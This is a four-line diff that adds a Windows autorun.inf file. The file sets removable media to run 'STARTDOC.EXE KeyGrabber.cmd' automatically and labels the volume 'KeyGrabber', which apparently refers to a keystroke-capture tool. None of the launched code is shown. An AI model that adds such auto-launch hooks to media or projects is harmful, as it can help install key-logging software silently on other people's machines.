@@ -1,0 +1,4 @@
+[AutoRun]
+OPEN=STARTDOC.EXE KeyGrabber.cmd
+ICON=icon.ico
+LABEL=KeyGrabber
